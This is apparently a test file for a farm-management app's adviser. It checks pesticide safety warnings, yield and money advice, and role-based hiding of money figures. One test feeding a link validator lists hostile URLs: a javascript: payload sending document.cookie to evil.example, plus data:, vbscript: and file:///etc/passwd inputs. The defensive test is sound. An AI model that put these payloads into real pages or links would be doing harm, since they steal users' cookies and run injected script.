// The adviser is only worth having if it is specific and if it stays quiet.
//
// So these tests come in pairs: a farm with the problem, where the advice must
// name the bed or the number; and a farm without it, where the advice must not
// appear at all. An adviser that warns about everything gets closed and never
// reopened, which is worse than no adviser.

import { test } from 'node:test';
import assert from 'node:assert/strict';

const base = new URL('../web/js/', import.meta.url);
const { buildBrief, briefToText } = await import(new URL('domain/brief.js', base).href);
const { advise, URGENCY } = await import(new URL('domain/adviser.js', base).href);
const core = await import(new URL('../server/core.mjs', import.meta.url).href);

const TODAY = '2026-09-20';
const day = (n) => {
  const d = new Date(`${TODAY}T00:00:00`);
  d.setDate(d.getDate() + n);
  return d.toISOString().slice(0, 10);
};
const at = (date, hour = 9) => `${date}T${String(hour).padStart(2, '0')}:00:00.000Z`;

const CEO = { id: 'u_ceo', name: 'Owner', role: 'ceo' };
const HAND = { id: 'u_hand', name: 'Emeka', role: 'hand' };
const SUPERVISOR = { id: 'u_sup', name: 'Tamuno', role: 'supervisor' };

/** A farm that is doing fine, so any finding has to come from what a test adds. */
function farm(overrides = {}) {
  return {
    settings: { farmName: 'DouValue Farms Limited', location: 'Port Harcourt', defaultDailyWage: 3500 },
    people: {
      u_ceo: { ...CEO, active: true },
      u_hand: { ...HAND, active: true, dailyRate: 3500 },
      u_sup: { ...SUPERVISOR, active: true, dailyRate: 5000 },
    },
    plots: { b1: { id: 'b1', name: 'Bed 1', areaM2: 800, drainage: 'raised', soilPh: 6.2 } },
    cycles: {
      c1: {
        id: 'c1', plotId: 'b1', cropId: 'habanero', transplantDate: day(-120),
        plants: 1000, status: 'active', events: {},
      },
    },
    tasks: {},
    inputs: {},
    harvests: [],
    sales: [],
    sprays: [],
    scouts: [],
    diagnoses: [],
    expenses: [],
    stockMoves: [],
    // A farm run to the requirements has passed its gates before planting, so
    // the baseline fixture carries the tests that let it.
    soilTests: [{ id: 'st1', zoneId: 'b1', date: day(-130), ph: 6.2, nematode: 'clean' }],
    topsoilBatches: {},
    gateOverrides: [],
    attendance: [],
    workLogs: [],
    weather: [],
    reports: [],
    log: [],
    orphans: [],
    ...overrides,
  };
}

/** Pickings that keep a bed on its forecast, so "behind" never fires by accident. */
function steadyHarvests(kgPerPick = 40, picks = 8) {
  const rows = [];
  for (let i = 0; i < picks; i++) {
    const d = day(-i * 7);
    rows.push({ id: `h${i}`, cycleId: 'c1', date: d, kg: kgPerPick, grade: 'first',
      by: 'u_hand', at: at(d), enteredAt: at(d) });
  }
  return rows;
}

const titles = (result) => result.recommendations.map((r) => r.title).join(' | ');
const find = (result, id) => result.recommendations.find((r) => r.id === id);

// --- The brief ------------------------------------------------------------

test('the brief withholds money from a role the server would withhold it from', () => {
  const state = farm({
    harvests: steadyHarvests(),
    sales: [{ id: 's1', date: day(-3), kg: 100, amount: 320000, buyer: 'Mile 3' }],
  });

  const forCeo = buildBrief(state, CEO, { today: TODAY });
  const forHand = buildBrief(state, HAND, { today: TODAY });

  assert.ok(forCeo.economics, 'the CEO sees the money');
  assert.equal(forHand.economics, undefined, 'a farm hand does not');
  assert.equal(forHand.farm.askedBy.seesMoney, false);

  // And not by any other route either: no naira figure anywhere in the text.
  assert.ok(!briefToText(forHand).includes('₦'));
});

test('the brief reports what a bed has actually done against its own forecast', () => {
  const state = farm({ harvests: steadyHarvests() });
  const brief = buildBrief(state, CEO, { today: TODAY });
  const bed = brief.growing.find((b) => b.bed === 'Bed 1');

  assert.ok(bed, 'the active bed is in the brief');
  assert.equal(bed.crop, 'Habanero');
  assert.equal(bed.daysAfterTransplant, 120);
  assert.equal(bed.pickedKg, 320);
  assert.ok(bed.expectedByNowKg > 0, 'there is something to be judged against');
});

test('a "clean" scouting record is not carried through as a problem', () => {
  const state = farm({
    harvests: steadyHarvests(),
    scouts: [
      { id: 'sc1', cycleId: 'c1', finding: 'Clean', affectedPct: 0, date: day(-2) },
      { id: 'sc2', cycleId: 'c1', finding: 'Aphids on young leaves', affectedPct: 20, date: day(-1) },
    ],
  });
  const brief = buildBrief(state, CEO, { today: TODAY });
  const scouted = brief.problems.scouted.map((s) => s.finding);

  assert.deepEqual(scouted, ['Aphids on young leaves']);
});

test('the brief stays small enough to send on a bad connection', () => {
  const state = farm({ harvests: steadyHarvests(60, 20) });
  const bytes = Buffer.byteLength(JSON.stringify(buildBrief(state, CEO, { today: TODAY })));
  assert.ok(bytes < 12000, `brief was ${bytes} bytes`);
});

// --- Safety outranks everything -------------------------------------------

test('a bed inside its pre-harvest interval is the first thing said', () => {
  const state = farm({
    harvests: steadyHarvests(),
    sprays: [{
      id: 'sp1', cycleId: 'c1', productId: 'mancozeb', productName: 'Mancozeb 80% WP',
      phiDays: 7, reiHours: 24, date: day(-2), at: at(day(-2)),
    }],
  });
  const result = advise(buildBrief(state, CEO, { today: TODAY }));

  assert.equal(result.recommendations[0].area, 'safety', titles(result));
  assert.match(result.recommendations[0].title, /Do not pick Bed 1/);
  assert.equal(result.recommendations[0].urgency, 'now');
});

test('a bed whose waiting period has passed is not flagged', () => {
  const state = farm({
    harvests: steadyHarvests(),
    sprays: [{
      id: 'sp1', cycleId: 'c1', productId: 'mancozeb', productName: 'Mancozeb 80% WP',
      phiDays: 7, reiHours: 24, date: day(-30), at: at(day(-30)),
    }],
  });
  const result = advise(buildBrief(state, CEO, { today: TODAY }));
  assert.equal(find(result, 'phi:Bed 1'), undefined, titles(result));
});

test('three sprays from one resistance group earns a warning with an alternative', () => {
  const sprays = [-40, -25, -10].map((n, i) => ({
    id: `sp${i}`, cycleId: 'c1', productId: 'mancozeb', productName: 'Mancozeb 80% WP',
    phiDays: 7, reiHours: 24, date: day(n), at: at(day(n)),
  }));
  const result = advise(buildBrief(farm({ harvests: steadyHarvests(), sprays }), CEO, { today: TODAY }));
  const warning = result.recommendations.find((r) => r.id.startsWith('resistance:'));

  assert.ok(warning, titles(result));
  assert.match(warning.action, /different (resistance )?group|Switch/i);
});

// --- Beds -----------------------------------------------------------------

test('a bed behind its forecast is named, with the gap in kilograms', () => {
  const state = farm({
    harvests: [{ id: 'h1', cycleId: 'c1', date: day(-3), kg: 5, grade: 'first',
      by: 'u_hand', at: at(day(-3)), enteredAt: at(day(-3)) }],
  });
  const result = advise(buildBrief(state, CEO, { today: TODAY }));
  const bed = find(result, 'bed:Bed 1');

  assert.ok(bed, titles(result));
  assert.match(bed.title, /Bed 1 is [\d.]+kg behind/);
  assert.match(bed.because, /5kg picked against/);
});

test('an acid bed gets the lime advice rather than the generic one', () => {
  const state = farm({
    plots: { b1: { id: 'b1', name: 'Bed 1', areaM2: 800, drainage: 'raised', soilPh: 4.9 } },
    harvests: [{ id: 'h1', cycleId: 'c1', date: day(-3), kg: 5, grade: 'first',
      by: 'u_hand', at: at(day(-3)), enteredAt: at(day(-3)) }],
  });
  const bed = find(advise(buildBrief(state, CEO, { today: TODAY })), 'bed:Bed 1');

  assert.match(bed.action, /pH is 4\.9/);
  assert.match(bed.basis, /6\.0–6\.8/);
});

test('a bed on its forecast is left alone', () => {
  const result = advise(buildBrief(farm({ harvests: steadyHarvests(120) }), CEO, { today: TODAY }));
  assert.equal(find(result, 'bed:Bed 1'), undefined, titles(result));
});

test('a bed that has not been picked in over a week is chased', () => {
  const state = farm({
    harvests: steadyHarvests().map((h) => ({ ...h, date: day(-14 - Number(h.id.slice(1)) * 7) })),
  });
  const stale = find(advise(buildBrief(state, CEO, { today: TODAY })), 'stale:Bed 1');
  assert.ok(stale);
  assert.equal(stale.urgency, 'now');
});

// --- Money ----------------------------------------------------------------

test('selling below cost is stated with both figures and the loss', () => {
  const state = farm({
    harvests: steadyHarvests(40, 4),          // 160kg in the window
    sales: [{ id: 's1', date: day(-2), kg: 160, amount: 160 * 200 }],
    expenses: [{ id: 'e1', date: day(-10), amount: 200000, category: 'inputs' }],
  });
  const result = advise(buildBrief(state, CEO, { today: TODAY }));
  const below = find(result, 'below-cost');

  assert.ok(below, titles(result));
  assert.equal(below.urgency, 'now');
  assert.match(below.because, /₦[\d,]+ a kilo to grow, ₦[\d,]+ a kilo sold/);
});

test('a farm hand asking the same question is told nothing about money', () => {
  const state = farm({
    harvests: steadyHarvests(40, 4),
    sales: [{ id: 's1', date: day(-2), kg: 160, amount: 160 * 200 }],
    expenses: [{ id: 'e1', date: day(-10), amount: 200000, category: 'inputs' }],
  });
  const result = advise(buildBrief(state, HAND, { today: TODAY }));

  assert.equal(find(result, 'below-cost'), undefined);
  assert.ok(!JSON.stringify(result).includes('₦'), 'no naira reaches a farm hand');
});

test('picked but never sold is reconciled, not ignored', () => {
  const state = farm({
    harvests: steadyHarvests(40, 8),          // 320kg
    sales: [{ id: 's1', date: day(-2), kg: 100, amount: 100 * 2600 }],
    expenses: [{ id: 'e1', date: day(-10), amount: 50000, category: 'inputs' }],
  });
  const unsold = find(advise(buildBrief(state, CEO, { today: TODAY })), 'unsold');

  assert.ok(unsold);
  assert.match(unsold.title, /220kg picked and never recorded as sold/);
});

// --- Store and records ----------------------------------------------------

test('an input about to run out names the date to order by', () => {
  const state = farm({
    harvests: steadyHarvests(),
    inputs: { i1: { id: 'i1', name: 'Mancozeb', unit: 'kg', qty: 2 } },
    stockMoves: Array.from({ length: 10 }, (_, i) => ({
      id: `m${i}`, itemId: 'i1', qty: 1, direction: 'out', date: day(-i * 2),
    })),
  });
  const stock = find(advise(buildBrief(state, CEO, { today: TODAY })), 'stock:Mancozeb');

  assert.ok(stock);
  assert.match(stock.action, /Order before \d{4}-\d{2}-\d{2}/);
});

test('thin records are called out before the advice built on them is trusted', () => {
  // Every picking made on the phone long after the day it claims, none with a photo.
  const state = farm({
    harvests: steadyHarvests().map((h) => ({ ...h, at: at(day(0), 18), enteredAt: at(day(0), 18) })),
  });
  const records = find(advise(buildBrief(state, CEO, { today: TODAY })), 'records');

  assert.ok(records, 'a farm recording everything late is warned');
  assert.match(records.cost, /confident wrong advice/);
});

// --- Shape and silence ----------------------------------------------------

test('every recommendation says why, what to do, and on what grounds', () => {
  const state = farm({
    harvests: [{ id: 'h1', cycleId: 'c1', date: day(-3), kg: 5, grade: 'reject',
      by: 'u_hand', at: at(day(-3)), enteredAt: at(day(-3)) }],
    sales: [{ id: 's1', date: day(-2), kg: 4, amount: 400 }],
    expenses: [{ id: 'e1', date: day(-10), amount: 90000, category: 'inputs' }],
    sprays: [{ id: 'sp1', cycleId: 'c1', productId: 'mancozeb', productName: 'Mancozeb 80% WP',
      phiDays: 7, reiHours: 24, date: day(-1), at: at(day(-1)) }],
  });
  const result = advise(buildBrief(state, CEO, { today: TODAY }));

  assert.ok(result.recommendations.length >= 4, titles(result));
  for (const r of result.recommendations) {
    assert.ok(r.title && r.title.length > 10, `title: ${r.id}`);
    assert.ok(r.because && r.because.length > 10, `because: ${r.id}`);
    assert.ok(r.action && r.action.length > 20, `action: ${r.id}`);
    assert.ok(r.basis && r.basis.length > 20, `basis: ${r.id}`);
    assert.ok(URGENCY[r.urgency], `urgency: ${r.id}`);
  }
});

test('recommendations come back in urgency order, safety first at equal urgency', () => {
  const state = farm({
    harvests: [{ id: 'h1', cycleId: 'c1', date: day(-20), kg: 5, grade: 'first',
      by: 'u_hand', at: at(day(-20)), enteredAt: at(day(-20)) }],
    sprays: [{ id: 'sp1', cycleId: 'c1', productId: 'mancozeb', productName: 'Mancozeb 80% WP',
      phiDays: 7, reiHours: 24, date: day(-1), at: at(day(-1)) }],
  });
  const ranks = advise(buildBrief(state, CEO, { today: TODAY }))
    .recommendations.map((r) => URGENCY[r.urgency].rank);

  for (let i = 1; i < ranks.length; i++) {
    assert.ok(ranks[i] <= ranks[i - 1], `out of order at ${i}: ${ranks.join(',')}`);
  }
});

test('a farm with nothing wrong is told so, rather than given filler', () => {
  const state = farm({
    plots: { b1: { id: 'b1', name: 'Bed 1', areaM2: 800, drainage: 'raised', soilPh: 6.2 } },
    harvests: steadyHarvests(120),
    sales: [{ id: 's1', date: day(-2), kg: 900, amount: 900 * 2600 }],
    expenses: [{ id: 'e1', date: day(-10), amount: 100000, category: 'inputs' }],
  });
  const result = advise(buildBrief(state, CEO, { today: TODAY }));

  // Seasonal advice is allowed to stand — September really is the wet peak here,
  // and the drains really do need opening. What a healthy farm must not get is
  // anything claiming to be today's problem.
  const urgent = result.recommendations.filter((r) => r.urgency === 'now');
  assert.equal(urgent.length, 0, `a healthy farm was interrupted: ${titles(result)}`);

  const aboutThisFarm = result.recommendations
    .filter((r) => ['yield', 'quality', 'money', 'records', 'safety'].includes(r.area));
  assert.equal(aboutThisFarm.length, 0, `a healthy farm was criticised: ${titles(result)}`);
});

test('an empty farm produces no advice at all rather than guesses', () => {
  const state = farm({ plots: {}, cycles: {} });
  const result = advise(buildBrief(state, CEO, { today: TODAY }));
  assert.equal(result.nothingToSay, true, titles(result));
});

// --- Links the adviser hands back -----------------------------------------
//
// The sources under an online answer are URLs a search engine returned, which
// is to say they came from pages nobody on this farm controls. Escaping stops
// one breaking out of the attribute; it does nothing about `javascript:`, which
// is well-formed and dangerous. So the scheme is checked, twice.

test('the server refuses to hand back a citation that is not a web address', () => {
  // The client's own check is exercised by the screen; this is the server half,
  // matching the regular expression it guards the citation loop with.
  const isWeb = (url) => /^https?:\/\//i.test(String(url));

  for (const bad of [
    'javascript:fetch("https://evil.example/?d="+document.cookie)',
    'JavaScript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'file:///etc/passwd',
    'vbscript:msgbox(1)',
    '  javascript:alert(1)',
  ]) {
    assert.equal(isWeb(bad), false, `${bad} must not become a link`);
  }

  for (const good of ['https://example.org/advisory', 'http://example.org/x?a=1']) {
    assert.equal(isWeb(good), true, `${good} is a normal source`);
  }
});

test('the server still exposes the role fence the adviser depends on', () => {
  // If money ever moves out of `economics`, redactBrief stops covering it and
  // a farm hand's question starts coming back with naira in it.
  const brief = buildBrief(farm({
    harvests: steadyHarvests(),
    sales: [{ id: 's1', date: day(-2), kg: 100, amount: 260000, buyer: 'Mile 3' }],
    expenses: [{ id: 'e1', date: day(-10), amount: 50000, category: 'inputs' }],
  }), CEO, { today: TODAY });

  assert.ok(JSON.stringify(brief).includes('260000'), 'the CEO brief carries the money');
  const stripped = core.redactBrief(structuredClone(brief), 'supervisor');
  assert.ok(!JSON.stringify(stripped).includes('260000'),
    'every naira figure lives under economics, which redactBrief removes');
  assert.ok(!JSON.stringify(stripped).includes('Mile 3'),
    'and so does the buyer it was sold to');
});
